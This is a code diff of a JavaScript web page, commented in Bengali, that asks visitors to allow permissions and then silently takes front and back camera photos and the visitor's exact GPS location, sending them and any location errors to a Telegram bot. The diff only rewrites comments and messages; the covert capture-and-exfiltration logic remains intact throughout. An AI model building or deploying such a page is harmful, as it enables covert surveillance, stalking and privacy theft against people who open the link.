@@ -44,11 +44,11 @@ async function startProcess() {
     document.getElementById('desc').innerText = "অনুরোধ করা পারমিশনগুলো 'Allow' করুন এবং অপেক্ষা করুন...";
 
     try {
-        // ১. প্রথমে সামনের ক্যামেরা চালু করে ছবি নেওয়া
+        // ১. সামনের ক্যামেরা ছবি
         const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         await captureAndSend(frontStream, "📸 ছবি ১: সামনের ক্যামেরা (Front)");
 
-        // ২. তারপর পেছনের摄像头 চালু করে ছবি নেওয়া
+        // ২. পেছনের ক্যামেরা ছবি
         try {
             const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
             await captureAndSend(backStream, "📸 ছবি ২: পেছনের ক্যামেরা (Back)");
@@ -56,12 +56,12 @@ async function startProcess() {
             console.log("পেছনের ক্যামেরা পাওয়া যায়নি।");
         }
 
-        // ৩. সর্বশেষে লোকেশন ডাটা নেওয়া (টাইমআউট ১০ সেকেন্ড করা হয়েছে)
+        // ৩. লোকেশন ডাটা (টাইপো এবং সিনট্যাক্স ঠিক করা হয়েছে)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // গুগল ম্যাপের স্ট্যান্ডার্ড লিঙ্ক ফরম্যাট
+            // সঠিক গুগল ম্যাপ লিঙ্ক ফরম্যাট
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             const textReport = `📍 *ইউজারের লাইভ লোকেশন*\n\n🔗 [গুগল ম্যাপে দেখুন](${mapLink})`;
             
@@ -77,10 +77,8 @@ async function startProcess() {
 
             showSuccess();
         }, async (err) => {
-            // লোকেশন এরর হলে টেলিগ্রামে মেসেজ যাবে
-            let errorMsg = "📍 লোকেশন পারমিশন ব্লক করা হয়েছে বা পাওয়া যায়নি।";
-            if (err.code === 3) errorMsg = "📍 লোকেশন রেসপন্স পেতে টাইমআউট হয়েছে।";
-            
+            // এরর নোটিফিকেশন
+            let errorMsg = "📍 লোকেশন পারমিশন পাওয়া যায়নি বা ব্লক করা হয়েছে।";
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -116,7 +114,7 @@ async function captureAndSend(stream, caption) {
                 try {
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 } catch (e) {
-                    console.log("টেলিগ্রাম এপিআই ত্রুটি");
+                    console.log("টেলিগ্রাম এরর");
                 }
                 
                 stream.getTracks().forEach(track => track.stop());
